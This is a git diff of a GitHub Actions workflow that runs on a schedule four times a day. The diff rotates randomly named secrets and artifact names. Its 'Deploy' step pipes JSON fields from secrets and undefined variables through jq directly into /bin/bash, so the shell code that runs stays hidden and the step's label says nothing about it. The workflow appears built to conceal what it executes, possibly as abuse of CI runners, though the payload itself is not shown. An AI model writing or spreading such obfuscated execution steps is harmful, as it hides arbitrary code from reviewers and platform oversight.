@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '35 1,7,13,19 * * *'
+    - cron: '12 1,7,13,19 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,17 +16,14 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          aacj30483: ${{ secrets.aacj30483 }}
+          okk72528: ${{ secrets.okk72528 }}
         run: |
-          printf '%s' "$aacj30483" | jq -r .citl75042 | /bin/bash
-          echo $tzxl5 | jq -r .fh408 | /bin/bash
-          printf '%s' "$srxc7" | jq -r .nkiiq28850 | /bin/bash
-          echo $m0 | jq -r .zh92616 | /bin/bash
-          echo $n85 | jq -r .e842 | /bin/bash
+          printf '%s' "$okk72528" | jq -r .cy7432 | /bin/bash
+          printf '%s' "$ofze4325" | jq -r .daj5794 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: aswXbdTm
+          name: T1fUDc8C
           path: "*.zip"
           retention-days: 1
